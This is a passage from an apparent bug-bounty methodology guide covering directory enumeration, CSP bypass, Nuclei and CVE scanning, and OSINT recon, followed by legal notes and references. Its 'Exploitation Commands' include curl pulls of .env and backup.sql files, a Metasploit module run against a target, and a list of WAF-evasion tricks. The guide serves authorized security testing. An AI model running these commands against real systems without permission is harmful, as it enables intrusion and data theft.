pip3 install -r requirements.txt
```

**Key Detection Commands**:
```bash
# Directory brute‑forcing with ffuf
ffuf -u https://target.com/FUZZ -w /home/pwn/wordlists/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -o ffuf-dir.txt

# File enumeration with feroxbuster
feroxbuster -u https://target.com -w /home/pwn/wordlists/seclists/Discovery/Web-Content/common.txt -o ferox.txt

# Backup file discovery
ffuf -u https://target.com/FUZZ -w /home/pwn/wordlists/seclists/Discovery/Web-Content/backup.txt -mc 200 -o backups.txt
```

**Exploitation Commands**:
```bash
# Download sensitive files
curl -s "https://target.com/.env" | tee env.txt
curl -s "https://target.com/backup.sql" | tee backup.sql

# Find admin panels
ffuf -u https://target.com/FUZZ -w /home/pwn/wordlists/seclists/Discovery/Web-Content/admin-panels.txt -mc 200,301,302 -o admin.txt
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Directory enumeration via API endpoints, GraphQL, serverless functions**
- **Directory bypass via Unicode, base64, hex encoding**
- **Directory chaining with XSS, SSRF, RCE**
- **Automated detection with Nuclei templates, custom scripts**

**Prevention Guidance**:
- Restrict directory listing, hide sensitive files, use secure file permissions
- Implement proper authentication, authorization, regular security testing
- Monitor for directory enumeration attempts, anomalous file access patterns
- Educate developers about directory enumeration risks, secure coding practices

**References**: [OWASP Directory Traversal](https://owasp.org/www-community/attacks/Directory_traversal), [PortSwigger Directory Traversal](https://portswigger.net/web-security/file-path-traversal), [ffuf](https://github.com/ffuf/ffuf)

### 11.13 CSP Bypass

**Methodology Overview**:
- **CSP analysis** – Parse CSP headers, identify weak directives, missing directives
- **CSP bypass** – Exploit script‑src `unsafe‑inline`, `unsafe‑eval`, whitelist flaws
- **CSP chaining** – Combine with XSS, clickjacking, data exfiltration

**Tool Installation**:
```bash
# CSP‑evaluator (Chrome extension)
# csp‑parser (Python library)
pip3 install csp‑parser
```

**Key Detection Commands**:
```bash
# Extract CSP headers
curl -I "https://target.com" | grep -i "content-security-policy"

# Analyze CSP with csp‑evaluator
python3 -c "import csp_parser; csp = csp_parser.parse('default-src self'); print(csp.directives)"

# Test for bypasses
curl -s "https://target.com/page" | grep -i "script-src.*unsafe"
```

**Exploitation Commands**:
```bash
# Bypass via whitelist
# If script‑src includes `https://cdn.example.com`, host malicious script on that domain

# Bypass via JSONP endpoints
# If script‑src includes `https://api.target.com/jsonp`, use JSONP callback to execute code

# Bypass via AngularJS sandbox escape
# If AngularJS used and CSP allows `unsafe‑eval`, use sandbox escape payloads
```

**Advanced Techniques (2025‑2026 Trends)**:
- **CSP bypass via service workers, WebAssembly, WebGL**
- **CSP bypass via browser quirks, parser inconsistencies, directive misordering**
- **CSP chaining with XSS, clickjacking, data exfiltration**
- **Automated detection with CSP‑evaluator, Nuclei templates**

**Prevention Guidance**:
- Implement strict CSP, avoid `unsafe‑inline`, `unsafe‑eval`, use nonces/hashes
- Regularly audit CSP, monitor for bypass attempts, use reporting endpoints
- Educate developers about CSP risks, secure coding practices

**References**: [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html), [PortSwigger CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy), [CSP‑Evaluator](https://csp-evaluator.withgoogle.com/)

### 11.14 Nuclei Vulnerability Scanning

**Methodology Overview**:
- **Nuclei setup** – Install Nuclei, update templates, configure workflows
- **Template selection** – Choose templates based on target technology, vulnerability type
- **Scan execution** – Run scans with appropriate rate limiting, concurrency, output formats
- **Result analysis** – Validate findings, eliminate false positives, prioritize remediation

**Tool Installation**:
```bash
# Install Nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Update Nuclei and templates
nuclei -update
nuclei -ut
```

**Key Detection Commands**:
```bash
# Basic scan
nuclei -u https://target.com -o nuclei-results.txt

# Scan with specific templates
nuclei -u https://target.com -t cves/ -o cves.txt

# Scan with rate limiting
nuclei -l targets.txt -rl 100 -c 10 -o scan.txt

# Scan with tags
nuclei -u https://target.com -tags xss,ssrf -o tagged.txt
```

**Exploitation Commands**:
```bash
# Validate findings manually
# Use curl, browser, etc. to confirm vulnerabilities

# Automate validation with nuclei‑validation scripts
# Custom scripts to verify specific vulnerability types
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Custom template creation** – Write Nuclei templates for new vulnerabilities, technologies
- **Workflow automation** – Integrate Nuclei into CI/CD, bug‑bounty pipelines
- **Cloud‑native scanning** – Scan AWS, Azure, GCP assets with Nuclei
- **Real‑time monitoring** – Continuous scanning with nuclei‑monitor

**Prevention Guidance**:
- Regularly scan own assets with Nuclei, fix discovered vulnerabilities
- Monitor for Nuclei scanning attempts, block malicious scanners
- Educate developers about Nuclei, security testing, secure coding practices

**References**: [Nuclei Documentation](https://nuclei.projectdiscovery.io/), [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates), [ProjectDiscovery](https://projectdiscovery.io/)

### 11.15 CVE‑Specific Checks

**Methodology Overview**:
- **CVE identification** – Map target technologies to known CVEs, prioritize by severity
- **CVE detection** – Use Nuclei, Metasploit, custom scripts to detect vulnerable versions
- **CVE exploitation** – Use public exploits, PoCs, Metasploit modules
- **CVE mitigation** – Patch, workarounds, security controls

**Tool Installation**:
```bash
# Searchsploit (Exploit‑DB)
sudo apt install exploitdb
searchsploit -u

# Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall
```

**Key Detection Commands**:
```bash
# Search for CVEs
searchsploit Apache 2.4.49

# Nuclei CVE scanning
nuclei -l targets.txt -t cves/ -o cves.txt

# Version detection
curl -I "https://target.com" | grep -i "server\|x-powered-by"
```

**Exploitation Commands**:
```bash
# Metasploit module
msfconsole
use exploit/linux/http/apache_mod_proxy_cve_2021_40438
set RHOSTS target.com
run

# Public PoC
python3 exploit.py -t target.com
```

**Advanced Techniques (2025‑2026 Trends)**:
- **CVE chaining** – Combine multiple CVEs for privilege escalation, lateral movement
- **Zero‑day discovery** – Fuzzing, static analysis, vulnerability research
- **CVE monitoring** – Track new CVEs, automate detection, patch management
- **Cloud‑native CVEs** – Cloud‑specific vulnerabilities (AWS, Azure, GCP)

**Prevention Guidance**:
- Regularly patch systems, monitor for new CVEs, use vulnerability scanners
- Implement security controls, network segmentation, least privilege
- Educate developers about CVE risks, secure coding practices

**References**: [CVE Details](https://www.cvedetails.com/), [Exploit‑DB](https://www.exploit-db.com/), [NVD](https://nvd.nist.gov/)

### 11.16 Specialized Reconnaissance

**Methodology Overview**:
- **Target‑specific recon** – Tailor reconnaissance to target industry, technology, geography
- **Advanced OSINT** – Social media, GitHub, Shodan, Censys, satellite imagery
- **Physical recon** – Location mapping, wireless networks, social engineering
- **Automated recon** – Custom scripts, workflows, continuous monitoring

**Tool Installation**:
```bash
# theHarvester (email, subdomain, etc.)
git clone https://github.com/laramies/theHarvester.git
cd theHarvester
pip3 install -r requirements.txt

# SpiderFoot (OSINT automation)
git clone https://github.com/smicallef/spiderfoot.git
cd spiderfoot
pip3 install -r requirements.txt
```

**Key Detection Commands**:
```bash
# Email harvesting
python3 theHarvester.py -d target.com -b all

# Subdomain enumeration
amass enum -passive -d target.com -o amass.txt

# Shodan search
shodan search "ssl:target.com"
```

**Exploitation Commands**:
```bash
# GitHub dorking
git clone https://github.com/techgaun/github-dorks.git
cd github-dorks
python3 github_dork.py target.com

# Satellite imagery analysis
# Use Google Earth, Sentinel Hub, etc.
```

**Advanced Techniques (2025‑2026 Trends)**:
- **AI‑powered recon** – ML‑based target profiling, anomaly detection
- **Blockchain recon** – Ethereum, Bitcoin address analysis, smart contract auditing
- **IoT recon** – Shodan, Censys for IoT devices, industrial control systems
- **Cloud recon** – AWS, Azure, GCP asset discovery, misconfiguration detection

**Prevention Guidance**:
- Limit public information, use privacy settings, monitor for data leaks
- Implement security controls, regular audits, employee training
- Educate developers about recon risks, secure coding practices

**References**: [theHarvester](https://github.com/laramies/theHarvester), [SpiderFoot](https://github.com/smicallef/spiderfoot), [OSINT Framework](https://osintframework.com/)

### 11.17 Nuclei Cheat Sheets

**Methodology Overview**:
- **Nuclei command reference** – Common flags, options, workflows
- **Template syntax** – YAML structure, matchers, extractors, variables
- **Advanced usage** – Custom templates, workflows, integrations
- **Best practices** – Rate limiting, false positive reduction, reporting

**Tool Installation**:
```bash
# Already installed in previous section
```

**Key Detection Commands**:
```bash
# List all templates
nuclei -tl

# List templates by tag
nuclei -tags cve -tl

# List templates by author
nuclei -author geeknik -tl
```

**Exploitation Commands**:
```bash
# Run template by ID
nuclei -u https://target.com -id CVE-2021-44228

# Run templates from directory
nuclei -u https://target.com -t ~/custom-templates/

# Run with custom headers
nuclei -u https://target.com -H "Authorization: Bearer token"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Custom template development** – Write templates for new vulnerabilities, technologies
- **Workflow automation** – Integrate Nuclei into CI/CD, bug‑bounty pipelines
- **Cloud‑native scanning** – Scan AWS, Azure, GCP assets with Nuclei
- **Real‑time monitoring** – Continuous scanning with nuclei‑monitor

**Prevention Guidance**:
- Regularly scan own assets with Nuclei, fix discovered vulnerabilities
- Monitor for Nuclei scanning attempts, block malicious scanners
- Educate developers about Nuclei, security testing, secure coding practices

**References**: [Nuclei Documentation](https://nuclei.projectdiscovery.io/), [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates), [ProjectDiscovery](https://projectdiscovery.io/)

---

## 12. Important Notes & Best Practices

### Legal & Ethical Considerations
- **Authorization is mandatory** – Only test systems you own or have explicit written permission to test. Unauthorized scanning is illegal and unethical.
- **Respect scope** – Stay within the defined target domains, IP ranges, and time windows. Avoid production systems during peak hours.
- **Data handling** – Do not exfiltrate, modify, or delete sensitive data. If you accidentally access PII, report it immediately and stop testing.
- **Disclosure policy** – Follow responsible disclosure procedures (e.g., 90‑day deadlines, coordinated disclosure). Do not publicly disclose vulnerabilities before they are fixed.

### Rate Limiting & Responsible Scanning
- **Throttle requests** – Use `-rate`, `-delay`, `-t` flags to avoid overwhelming target servers. Start with low concurrency (e.g., `-t 10`).
- **Respect `robots.txt`** – Although not legally binding, it indicates the site owner’s crawling preferences.
- **Monitor target response** – If you see HTTP 429/503 errors, slow down or pause scanning.
- **Use random user‑agents** – Rotate user‑agents to mimic legitimate traffic and avoid simple blocking.

### WAF & Anti‑Scanning Bypass Techniques
- **IP rotation** – Use proxy chains (e.g., `-proxy http://127.0.0.1:8080`) or services like Shodan, Censys.
- **Header manipulation** – Add benign headers (`X‑Forwarded‑For`, `X‑Real‑IP`), use `-H` to mimic browsers.
- **Parameter pollution** – Send duplicate parameters (`?id=1&id=2`) to confuse WAF parsing.
- **Unicode normalization** – Use Unicode homoglyphs, URL‑encode special characters.
- **Case variation** – Mix upper/lower case in headers, parameters, paths.
- **HTTP method tampering** – Try `GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `OPTIONS` for the same endpoint.
- **Slow‑loris / time‑based evasion** – Send requests slowly to avoid rate‑limit detection.

### Workflow Best Practices
1. **Reconnaissance first** – Spend 70% of time on recon (subdomains, URLs, technologies). More surface area = more bugs.
2. **Automate repetitive tasks** – Use scripts, workflows (`nuclei‑workflows`, `chaos‑client`), and toolchains.
3. **Organize results** – Keep a consistent directory structure (`recon/`, `vulns/`, `report/`). Use `anew`, `grep`, `sort -u`.
4. **Prioritize high‑impact vulnerabilities** – Focus on RCE, SSRF, SQLi, auth bypass, business‑logic flaws.
5. **Validate findings manually** – Automated tools produce false positives; always verify with manual testing.
6. **Keep notes** – Document commands, payloads, and observations. Tools like `obsidian`, `joplin`, or simple markdown.

### Tool Management
- **Keep tools updated** – Regularly run `git pull`, `go install`, `pip install --upgrade`.
- **Use virtual environments** – Isolate Python tools (`venv`, `pipenv`) to avoid dependency conflicts.
- **Maintain wordlists** – Curate custom wordlists for your target (technology‑specific, industry‑specific).
- **Backup configurations** – Save your `.config/`, `.nuclei‑config`, `~/.gf/` patterns.

### Reporting & Communication
- **Clear reproduction steps** – Include exact request/response pairs (curl commands, screenshots).
- **Impact analysis** – Explain the business risk, potential damage, and affected users.
- **Remediation advice** – Provide concrete mitigation steps (code snippets, configuration changes).
- **Professional tone** – Be polite, constructive, and patient. Bug‑bounty is a collaboration.

### Continuous Learning
- **Follow 2025–2026 trends** – AI‑assisted hacking, cloud‑native vulnerabilities, API‑first architectures.
- **Participate in communities** – Twitter/X (#bugbounty), Discord servers, local meetups.
- **Write write‑ups** – Share your methodology; teaching reinforces learning.

---

## 13. References

> Aggregated from all 47 vulnerability‑category READMEs. Each category includes specific tool references, OWASP guides, and up‑to‑date blog posts.

### Recon Workflow
- **01‑Subdomain‑Enumeration**:
- **02‑Live‑Host‑Discovery**:
- **03‑URL‑Collection**:
- **04‑Sensitive‑Files**:
- **05‑Technology‑Detection**:

### API & Authentication Testing
- **06‑API‑Testing**:
  - **OWASP API Security Top 10 2023**: https://owasp.org/www-project-api-security/
  - **PortSwigger API Testing**: https://portswigger.net/web-security/api-testing
  - **PayloadsAllTheThings – API**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API
  - **GraphQL Security Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
  - **Kiterunner**: https://github.com/assetnote/kiterunner
  - **Arjun – HTTP Parameter Discovery**: https://github.com/s0md3v/Arjun
- **07‑GraphQL**:
  - **OWASP GraphQL Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
  - **PortSwigger GraphQL API vulnerabilities**: https://portswigger.net/web-security/graphql
  - **PayloadsAllTheThings – GraphQL Injection**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
  - **GitHub Security Lab – GraphQL Security**: https://securitylab.github.com/research/graphql
  - **GraphQL Foundation Security WG**: https://github.com/graphql/graphql-wg/tree/main/agendas
  - **2025‑2026 Trends**: Introspection bypass via error guessing, alias brute‑force, persistent batching DoS, field‑level auth bypass
- **08‑JWT**:
  - **PortSwigger JWT Attacks**: https://portswigger.net/web-security/jwt
  - **PortSwigger JWT Algorithm Confusion**: https://portswigger.net/web-security/jwt/algorithm-confusion
  - **OWASP JWT Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
  - **PayloadsAllTheThings – JWT**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Tokens
  - **JWT Best Practices Internet Draft**: https://datatracker.ietf.org/doc/draft-ietf-oauth-jwt-bcp/
  - **GitHub – jwt_tool**: https://github.com/ticarpi/jwt_tool
  - **2025‑2026 Trends**: kid RCE, jku spoofing, public‑HMAC downgrade (Intigriti/HackerOne write‑ups)
- **09‑Authentication**:
  - **OWASP Top 10 2025 A07: Authentication Failures**: https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/
  - **OWASP Authentication Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
  - **PortSwigger Authentication Labs**: https://portswigger.net/web-security/authentication
  - **NIST SP800-63B Digital Identity Guidelines**: https://pages.nist.gov/800-63-3/sp800-63b.html
  - **HaveIBeenPwned Pwned Passwords**: https://haveibeenpwned.com/Passwords
  - **2025‑2026 Trends**: Account takeover via race conditions, MFA bypass via SIM‑swap hints, hybrid credential stuffing attacks
- **10‑API‑Key‑Leakage**:
  - **GitHub Secret Scanning**: https://docs.github.com/en/code-security/secret-scanning
  - **GitLab Secret Detection**: https://docs.gitlab.com/ee/user/application_security/secret_detection/
  - **OWASP Proactive Controls C3: Secure Database Access**: https://owasp.org/www-project-proactive-controls/v3/en/c3-secure-database
  - **TruffleHog**: https://github.com/trufflesecurity/trufflehog
  - **gitleaks**: https://github.com/gitleaks/gitleaks
  - **HaveIBeenPwned Pwned Passwords**: https://haveibeenpwned.com/Passwords
  - **2025‑2026 Trends**: AI‑assisted secret discovery, cloud metadata service abuse, CI/CD pipeline leaks

### Classic Web Vulnerabilities
- **11‑XSS**:
  - **PortSwigger XSS Cheat Sheet (2026 Edition):** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
  - **OWASP XSS Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
  - **PayloadsAllTheThings – XSS Injection:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
  - **OWASP DOM-based XSS Prevention:** https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
  - **XSS Filter Evasion Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
  - **Web-Vulnerability-Testing-Checklist XSS.md:** ../Web-Vulnerability-Testing-Checklist/XSS.md
- **12‑SQL‑Injection**:
  - **PortSwigger SQL Injection Cheat Sheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet
  - **OWASP SQL Injection Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
  - **PayloadsAllTheThings – SQL Injection:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
  - **Advanced SQL Injection Cheatsheet:** https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet
  - **SQLMap Documentation:** https://github.com/sqlmapproject/sqlmap/wiki
  - **Ghauri Documentation:** https://github.com/r0oth3x49/ghauri
  - **Web-Vulnerability-Testing-Checklist SQL-Injection.md:** ../Web-Vulnerability-Testing-Checklist/SQL-Injection.md
- **13‑SSRF**:
  - **Checklist**: [Web-Vulnerability-Testing-Checklist/SSRF.md](../Web-Vulnerability-Testing-Checklist/SSRF.md)
  - **PortSwigger SSRF**: https://portswigger.net/web-security/ssrf
  - **PortSwigger URL Validation Bypass Cheat Sheet**: https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
  - **PayloadsAllTheThings – SSRF**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
  - **OWASP SSRF Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
  - **2025–2026 trends**: Grafana SSRF → AWS creds, IPv6 bypasses, redirect chains (CVEs 2025–2026)
- **14‑SSTI**:
  - **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/SSTI.md](../Web‑Vulnerability‑Testing‑Checklist/SSTI.md)
  - **PortSwigger Server‑Side Template Injection**: https://portswigger.net/web‑security/server‑side‑template‑injection
  - **PayloadsAllTheThings – SSTI**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
  - **OWASP SSTI Testing Guide**: https://owasp.org/www‑project‑web‑security‑testing‑guide/latest/4‑Web_Application_Security_Testing/07‑Input_Validation_Testing/18‑Testing_for_Server_Side_Template_Injection
  - **Recent 2025–2026 write‑ups**: Blind SSTI, sandbox escapes (YesWeHack, Intigriti bounties)
- **15‑Open‑Redirect**:
  - **OWASP Unvalidated Redirects and Forwards Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
  - **PortSwigger Open Redirect Research**: https://portswigger.net/web‑security/redirect‑based‑vulnerabilities
  - **PayloadsAllTheThings – Open Redirect**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
  - **2025–2026 write‑ups**: Bypass techniques, chained exploits (Bugcrowd, HackerOne, Intigriti)
- **16‑CRLF‑Injection**:
  - **OWASP HTTP Response Splitting**: https://owasp.org/www‑community/attacks/HTTP_Response_Splitting
  - **PortSwigger CRLF Injection**: https://portswigger.net/web‑security/crlf‑injection
  - **PayloadsAllTheThings – CRLF Injection**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection
  - **2025–2026 write‑ups**: Cache poisoning via CRLF, chained exploits (Bugcrowd, HackerOne)
- **17‑Path‑Traversal**:
  - **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/Path‑Traversal.md](../Web‑Vulnerability‑Testing‑Checklist/Path‑Traversal.md)
  - **PortSwigger File Path Traversal**: https://portswigger.net/web‑security/file‑path‑traversal
  - **PayloadsAllTheThings – Directory Traversal**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
  - **OWASP Path Traversal**: https://owasp.org/www‑community/attacks/Path_Traversal
  - **Advanced bypass repos (2025+)**: DeepakGhengat, YesWeHack articles, recent CVEs
- **18‑XXE**:
  - **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/XXE.md](../Web‑Vulnerability‑Testing‑Checklist/XXE.md)
  - **PortSwigger XXE**: https://portswigger.net/web‑security/xxe
  - **OWASP XML External Entity Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
  - **PayloadsAllTheThings – XXE**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
  - **YesWeHack 2026 Guide**, recent CVEs (Apache Tika 2025‑66516, Struts 2025‑68493, GeoServer 2025‑58360)
- **19‑CORS**:
  - **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/CORS.md](../Web‑Vulnerability‑Testing‑Checklist/CORS.md)
  - **PortSwigger CORS**: https://portswigger.net/web‑security/cors
  - **PortSwigger Exploiting CORS Misconfigurations**: https://portswigger.net/web‑security/cors/exploiting
  - **OWASP CORS Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross‑Origin_Resource_Sharing_Cheat_Sheet.html
  - **MDN CORS**: https://developer.mozilla.org/en‑US/docs/Web/HTTP/CORS
  - **PayloadsAllTheThings – CORS**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS
  - **Recent 2025–2026 write‑ups**: Reflected Origin + cache, null origin sandbox bypass (Intigriti/HackerOne)
- **20‑HTTP‑Host‑Header‑Attacks**:
  - **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/HTTP‑Host‑Header‑Attacks.md](../Web‑Vulnerability‑Testing‑Checklist/HTTP‑Host‑Header‑Attacks.md)
  - **PortSwigger HTTP Host Header Attacks**: https://portswigger.net/web‑security/host‑header
  - **PortSwigger Password Reset Poisoning**: https://portswigger.net/web‑security/host‑header/exploiting/password‑reset‑poisoning
  - **OWASP Testing for Host Header Injection**: https://owasp.org/www‑project‑web‑security‑testing‑guide/latest/4‑Web_Application_Security_Testing/07‑Input_Validation_Testing/17‑Testing_for_Host_Header_Injection
  - **PayloadsAllTheThings – Host Header**: https://github.com/swisskyrepo/PayloadsAllTheThings (search Host section)
  - **Recent 2025–2026 CVEs**: Koa CVE‑2026‑27959, Undertow CVE‑2025‑12543, Astro SSRF chains, bounty write‑ups on reset hijacking (Medium/Intigriti)
- **21‑Web‑Cache‑Poisoning**:
  - **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/Web‑Cache‑Poisoning.md](../Web‑Vulnerability‑Testing‑Checklist/Web‑Cache‑Poisoning.md)
  - **PortSwigger Web Cache Poisoning**: https://portswigger.net/web‑security/web‑cache‑poisoning
  - **PortSwigger Practical Web Cache Poisoning**: https://portswigger.net/research/practical‑web‑cache‑poisoning
  - **PortSwigger Web Cache Entanglement**: https://portswigger.net/research/web‑cache‑entanglement
  - **OWASP Cache Poisoning**: https://owasp.org/www‑community/attacks/Cache_Poisoning
  - **PayloadsAllTheThings – Web Cache Deception/Poisoning**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception
  - **Recent 2025–2026 top techniques**: Next.js chains, parser discrepancies, poisoned DoS
- **22‑HTTP‑Request‑Smuggling**:
  - **PortSwigger Research** – [HTTP Desync Attacks: Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
  - **PortSwigger Research** – [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)
  - **PortSwigger Research** – [Browser‑Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
  - **PortSwigger Research** – [HTTP/1.1 Must Die: The Desync Endgame (2025)](https://portswigger.net/research/http1-must-die)
  - **OWASP WSTG INPV‑16** – [Testing for HTTP Request Smuggling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Request_Smuggling)
  - **PayloadsAllTheThings** – [HTTP Request Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Request%20Smuggling)
  - **Recent CVEs (2025–2026)** – Akamai CVE‑2025‑32094, ASP.NET Core Kestrel CVE‑2025‑55315
- **23‑Prototype‑Pollution**:
  - **PortSwigger Web Security Academy** – [Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
  - **OWASP Cheat Sheet Series** – [Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
  - **PayloadsAllTheThings** – [Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution)
  - **Snyk Research** – Prototype Pollution in Node.js (2025–2026 updates)
  - **Recent Bounties (2025–2026)** – Next.js pollution → RCE, lodash gadget rediscovery (Intigriti/HackerOne)
- **24‑DOM‑Based‑Vulnerabilities**:
  - **PortSwigger Web Security Academy** – [DOM‑based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
  - **PortSwigger DOM‑based vulnerabilities overview** – [DOM‑based](https://portswigger.net/web-security/dom-based)
  - **OWASP Cheat Sheet Series** – [DOM‑based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
  - **PortSwigger XSS Cheat Sheet 2026 Edition** – [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
  - **PayloadsAllTheThings** – [DOM XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
  - **Recent write‑ups (2025–2026)** – postMessage, framework escapes, Trusted Types bypass (Intigriti, Medium bounties)

### Cloud & JavaScript Analysis
- **26‑Firebase‑Database**:
  - **Firebase Security Rules Documentation** – [Firebase Rules Guide](https://firebase.google.com/docs/rules)
  - **OWASP Mobile Security Testing Guide** – [Firebase Security](https://owasp.org/www-project-mobile-security-testing-guide/)
  - **Firebase‑scanner** – [GitHub Repository](https://github.com/shivsahni/FireBaseScanner)
  - **Firebase Exploitation Blog Posts** – [Medium Articles](https://medium.com/tag/firebase‑security)
  - **Recent Research (2025–2026)** – Firestore rule bypasses, Firebase App Check circumvention, chained vulnerabilities
- **27‑Azure‑Blob‑Storage**:
  - **Microsoft Azure Storage Security Guide** – [Azure Documentation](https://docs.microsoft.com/en‑us/azure/storage/blobs/security‑recommendations)
  - **OWASP Cloud Security** – [Cloud Storage Security](https://owasp.org/www‑project‑cloud‑security/)
  - **MicroBurst** – [Azure Security Toolkit](https://github.com/NetSPI/MicroBurst)
  - **Azure Storage SAS Token Reference** – [SAS Overview](https://docs.microsoft.com/en‑us/azure/storage/common/storage‑sas‑overview)
  - **Recent Research (2025–2026)** – SAS token leakage patterns, firewall bypass techniques, cross‑tenant attacks
- **28‑GCP‑Storage**:
  - **Google Cloud Storage Security Best Practices** – [GCP Documentation](https://cloud.google.com/storage/docs/security)
  - **OWASP Cloud Security** – [Cloud Storage Security](https://owasp.org/www‑project‑cloud‑security/)
  - **GCPBucketBrute** – [GitHub Repository](https://github.com/RhinoSecurityLabs/GCPBucketBrute)
  - **gsutil Command Reference** – [Google Cloud Documentation](https://cloud.google.com/storage/docs/gsutil)
  - **Recent Research (2025–2026)** – IAM condition bypasses, cross‑project bucket access, uniform bucket‑level access misconfigurations
- **29‑Cloud‑Credential‑Files**:
  - **OWASP Secrets Management Cheat Sheet** – [OWASP Documentation](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
  - **GitGuardian Public Monitoring** – [GitGuardian](https://gitguardian.com)
  - **TruffleHog Documentation** – [TruffleSecurity](https://trufflesecurity.com)
  - **GitHub Secret Scanning** – [GitHub Docs](https://docs.github.com/en/code‑security/secret‑scanning)
  - **Recent Research (2025–2026)** – CI/CD secret leakage patterns, container image secret detection, metadata service attacks
- **30‑JavaScript‑Analysis**:
  - **OWASP Client‑Side Security Cheat Sheet** – [OWASP Documentation](https://cheatsheetseries.owasp.org/cheatsheets/Client_Side_Security_Cheat_Sheet.html)
  - **PortSwigger Web Security Academy – Client‑side topics** – [PortSwigger](https://portswigger.net/web-security)
  - **LinkFinder** – [GitHub Repository](https://github.com/GerbenJavado/LinkFinder)
  - **TruffleHog** – [TruffleSecurity](https://trufflesecurity.com)
  - **Recent Research (2025–2026)** – JavaScript source map leaks, client‑side storage attacks, API key scope abuse

### Advanced & Specialized Checks
- **31‑Command‑Injection**:
  - **PortSwigger OS Command Injection:** https://portswigger.net/web-security/os-command-injection
  - **OWASP OS Command Injection Defense Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
  - **PayloadsAllTheThings – Command Injection:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
  - **Commix Documentation:** https://github.com/commixproject/commix
  - **SecLists Command Injection Payloads:** https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/command-injection
  - **Web-Vulnerability-Testing-Checklist Command-Injection.md:** ../Web-Vulnerability-Testing-Checklist/Command-Injection.md
- **32‑Business‑Logic**:
